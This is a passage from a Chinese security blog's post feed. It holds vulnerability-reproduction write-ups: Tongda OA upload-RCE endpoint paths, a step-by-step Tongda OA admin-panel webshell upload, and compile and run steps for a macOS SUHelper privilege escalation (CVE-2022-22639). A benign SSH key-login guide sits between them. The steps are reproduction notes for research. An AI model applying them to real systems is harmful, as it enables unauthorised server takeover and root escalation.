<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ispirit/im/upload.php</span><br><span class="line">/ispirit/interface/gateway.php</span><br></pre></td></tr></table></figure>

<p><strong>例如2017：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ispirit/im/upload.php</span><br><span class="line">/mac/gateway.php</span><br><span class="line"></span><br><span class="line">C:\MYOA&gt;dir /s /b gateway.php</span><br><span class="line">C:\MYOA\webroot\mac\gateway.php</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>上传后无回显：</strong></li>
</ul>
<p><img src="/../images/upload/noecho.png" alt="noecho"></p>
<p>部分网站无上传回显，把UPLOAD_MODE参数的值改为1就可以正常拿到上传后的文件名了。</p>
<p><img src="/../images/upload/noecho2.png" alt="noecho2"></p>
<ul>
<li><strong>为什么你没成功：</strong></li>
</ul>
<p>我试了许多版本，发现返回<code>2005_xxxxxx</code>的都不能成功，网上复现利用成功的都是<code>2003_xxxxxx</code><br>不知道怎么搞</p>
<hr>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vT0EtdG9uZ2RhLVJDRQ==">参考链接🔗<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>通达OA</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA 后台GetShell</title>
    <url>/2020/%E9%80%9A%E8%BE%BEOA3.html</url>
    <content><![CDATA[<h3 id="0x01-如何后台"><a href="#0x01-如何后台" class="headerlink" title="0x01 如何后台"></a>0x01 如何后台</h3><p>怎么进入后台随便你，可以利用前段时间的<code>任意用户登录漏洞</code></p>
<p><img src="/../images/upload/loginadmin.png" alt="login"></p>
<span id="more"></span>

<h3 id="0x02-更改配置"><a href="#0x02-更改配置" class="headerlink" title="0x02 更改配置"></a>0x02 更改配置</h3><p>此处利用系统管理-&gt;附件管理📎</p>
<p><img src="/../images/upload/fujian.png" alt="fujian"></p>
<p>此站点并未设置存储目录，点击添加目录</p>
<p><img src="/../images/upload/fujian2.png" alt="fujian"></p>
<p>目录中要设置网站根目录，根目录可以通过系统管理-&gt;系统信息处获得</p>
<p><img src="/../images/upload/fujian3.png" alt="gujian3"></p>
<p><img src="/../images/upload/fujian4.png" alt="fujian4"></p>
<p>记得勾选<code>将所有新附件存该目录</code>，然后保存</p>
<p><img src="/../images/upload/fujian5.png" alt="fujian5"></p>
<h3 id="0x03-上传附件"><a href="#0x03-上传附件" class="headerlink" title="0x03 上传附件"></a>0x03 上传附件</h3><p>通过组织下的聊天框，选中自己后发送任意附件，利用BurpSuite拦截</p>
<p><img src="/../images/upload/fujian6.png" alt="fujian6"></p>
<p><img src="/../images/upload/oa31.png" alt="oa31"></p>
<p><a href="../file/upshell.txt">上传附件 request.txt</a></p>
<p><img src="/../images/upload/oa3.png" alt="oa3"></p>
<p><img src="/../images/upload/oa32.png" alt="oa32"></p>
<p><img src="/../images/upload/oa33.png" alt="oa33"></p>
<p><img src="/../images/upload/oa34.png" alt="oa34"></p>
]]></content>
      <categories>
        <category>通达OA</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>配置ssh密钥登录</title>
    <url>/2019/%E9%85%8D%E7%BD%AEssh%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95.html</url>
    <content><![CDATA[<p>​        我们常用 SSH 来远程管理 Linux 服务器。但是，一般的密码方式登录，容易有密码被<font color=red>暴力破解</font>的问题。<br>所以，一般我们会将 SSH 的端口设置为默认的 22 以外的端口，或者禁用 root 账户登录。其实，有一个更好的办法来保证安全，而且让你可以放心地用 root 账户从远程登录——<font color=green>那就是通过密钥方式登录</font>。</p>
<p>​        密钥形式登录的原理是：利用密钥生成器制作一对密钥(一个公钥和一个私钥)。将公钥添加到服务器的某个账户上，然后在客户端利用私钥即可完成认证并登录。这样一来，没有私钥，任何人都无法通过 SSH 暴力破解你的密码来远程登录到系统。此外，如果将公钥复制到其他账户甚至主机，利用私钥也可以登录。<span id="more"></span></p>
<p>下面来说说如何在 Linux 服务器上制作密钥对，将公钥添加给账户，设置 SSH，最后通过客户端登录。</p>
<h3 id="1-制作密钥对"><a href="#1-制作密钥对" class="headerlink" title="1. 制作密钥对"></a>1. 制作密钥对</h3><p>首先在服务器上制作密钥对。首先用密码登录到打算使用密钥登录的账户，然后执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@host ~]$ ssh-keygen  &lt;== 建立密钥对</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa): &lt;== 按 Enter</span><br><span class="line">Created directory &#x27;/root/.ssh&#x27;.</span><br><span class="line">Enter passphrase (empty for no passphrase): &lt;== 输入密钥锁码，或直接按 Enter 留空</span><br><span class="line">Enter same passphrase again: &lt;== 再输入一遍密钥锁码</span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa. &lt;== 私钥</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub. &lt;== 公钥</span><br><span class="line">The key fingerprint is:</span><br><span class="line">0f:d3:e7:1a:1c:bd:5c:03:f1:19:f1:22:df:9b:cc:08 root@host</span><br></pre></td></tr></table></figure>

<p>密钥锁码在使用私钥时必须输入，这样就可以保护私钥不被盗用。当然，也可以留空，实现无密码登录。</p>
<p>现在，在 root 用户的家目录中生成了一个 .ssh 的隐藏目录，内含两个密钥文件。id_rsa 为私钥，id_rsa.pub 为公钥。</p>
<h3 id="2-在服务器上安装公钥"><a href="#2-在服务器上安装公钥" class="headerlink" title="2. 在服务器上安装公钥"></a>2. 在服务器上安装公钥</h3><p>键入以下命令，在服务器上安装公钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@host ~]$ cd .ssh</span><br><span class="line">[root@host .ssh]$ cat id_rsa.pub &gt;&gt; authorized_keys</span><br></pre></td></tr></table></figure>

<p>如此便完成了公钥的安装。为了确保连接成功，请保证以下文件权限正确：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@host .ssh]$ chmod 600 authorized_keys</span><br><span class="line">[root@host .ssh]$ chmod 700 ~/.ssh</span><br></pre></td></tr></table></figure>

<h3 id="3-设置-SSH，打开密钥登录功能"><a href="#3-设置-SSH，打开密钥登录功能" class="headerlink" title="3. 设置 SSH，打开密钥登录功能"></a>3. 设置 SSH，打开密钥登录功能</h3><p>编辑 &#x2F;etc&#x2F;ssh&#x2F;sshd_config 文件，进行如下设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br></pre></td></tr></table></figure>

<p>另外，请留意 root 用户能否通过 SSH 登录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure>

<p>当你完成全部设置，并以密钥方式登录成功后，再禁用密码登录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure>

<p>最后，重启 SSH 服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@host .ssh]$ service sshd restart</span><br></pre></td></tr></table></figure>

<h3 id="4-将私钥下载到客户端，然后转换为-PuTTY-能使用的格式"><a href="#4-将私钥下载到客户端，然后转换为-PuTTY-能使用的格式" class="headerlink" title="4. 将私钥下载到客户端，然后转换为 PuTTY 能使用的格式"></a>4. 将私钥下载到客户端，然后转换为 PuTTY 能使用的格式</h3><p>使用 WinSCP、SFTP 等工具将私钥文件 id_rsa 下载到客户端机器上。然后打开 PuTTYGen，单击 Actions 中的 Load 按钮，载入你刚才下载到的私钥文件。如果你刚才设置了密钥锁码，这时则需要输入。</p>
<p>载入成功后，PuTTYGen 会显示密钥相关的信息。在 Key comment 中键入对密钥的说明信息，然后单击 Save private key 按钮即可将私钥文件存放为 PuTTY 能使用的格式。</p>
<p>以后，当你使用 PuTTY 登录时，可以在左侧的 Connection -&gt; SSH -&gt; Auth 中的 Private key file for authentication: 处选择你的私钥文件，然后即可登录了，过程中只需输入密钥锁码即可。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>macos SUHelper提权漏洞(CVE-2022-22639)</title>
    <url>/2022/macos%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<p><font color=red>该文章可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，作者本人不承担任何法律及连带责任。</font></p>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>• 背景介绍   • 漏洞风险  • 影响版本  • 复现过程  • 漏洞修复</p>
<h3 id="0x01背景介绍"><a href="#0x01背景介绍" class="headerlink" title="0x01背景介绍"></a>0x01背景介绍</h3><blockquote>
<p>在macOS中软件更新助手的守护进程suhelperd中存在一个漏洞。suhelperd内部的一个类SUHelper通过进程间通信（IPC）机制提供基本的系统服务。</p>
</blockquote>
<p>该进程以root身份运行，并带有特殊授权（如com.apple.rootless.install）签名，该授权授予绕过系统完整性保护（SIP）限制的进程权限。</p>
<h3 id="0x02漏洞风险"><a href="#0x02漏洞风险" class="headerlink" title="0x02漏洞风险"></a>0x02漏洞风险</h3><p>这种功能的组合为恶意行为者提供利用机会，如果成功利用该漏洞，会允许根特权升级。被命名为CVE-2022-22639。<span id="more"></span></p>
<h3 id="0x03影响版本"><a href="#0x03影响版本" class="headerlink" title="0x03影响版本"></a>0x03影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">macos &lt; 13.3（不包括） </span><br><span class="line">iphone_os &lt; 15.4（不包括） </span><br><span class="line">ipados &lt; 15.4（不包括）</span><br></pre></td></tr></table></figure>

<h3 id="0x04复现过程"><a href="#0x04复现过程" class="headerlink" title="0x04复现过程"></a>0x04复现过程</h3><ol>
<li>查看本地环境</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sw_vers </span><br><span class="line">ProductName: macOS </span><br><span class="line">ProductVersion: 12.1  </span><br><span class="line">BuildVersion: 21C52</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/mask75/imgs@master/2022/04/06/20220406165604.png" alt="图片"></p>
<ol start="2">
<li>查看SIP状态</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$  csrutil status</span><br><span class="line">System Integrity Protection status: enabled.</span><br></pre></td></tr></table></figure>

<p><img src="https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxcfp2B2bMJvXFvpibcDfDBhKwZUCWEv4xuwNuVwWGNzfud54qhwzEfkW5Ox1oFZ2HgL9ib3siaaFYCSA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<ol start="3">
<li>执行如下命令，编译利用代码</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ clang exploit.m -o /tmp/exploit -framework Foundation -fobjc-arc -fobjc-link-runtime /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/System/Library/PrivateFrameworks/SoftwareUpdate.framework/Versions/A/SoftwareUpdate.tbd</span><br></pre></td></tr></table></figure>

<p><img src="https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxcfp2B2bMJvXFvpibcDfDBhKHAqBmhibRdcRvXeW6XkHBmXNY3GOe3LpdEWQceRiagl7fPwUYVn5ibhfg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<ol start="4">
<li>解压InstallAssistant.gz文件到 &#x2F;tmp 目录</li>
</ol>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxcfp2B2bMJvXFvpibcDfDBhKtXZiajPeOvic5PWTnnpueD1VRqa7PcNsmNtn1kUWBBplGWd5VAxBAQcg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<ol start="5">
<li>执行exploit &#x2F;tmp&#x2F;.exploit</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ /tmp/.exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://mmbiz.qpic.cn/mmbiz_png/z1MHPE7moxcfp2B2bMJvXFvpibcDfDBhK2MYw8pPAQYIOhgUHjwicf1Q44UB8ToOUica8nHhER5b1zAic6409ZH2DA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h3 id="0x05漏洞修复"><a href="#0x05漏洞修复" class="headerlink" title="0x05漏洞修复"></a>0x05漏洞修复</h3><p>更新系统至macOS Monterey 12.3</p>
<p><strong>利用代码：（公众号回复“mac”获取）</strong></p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>Penetration</tag>
      </tags>
  </entry>
</search>
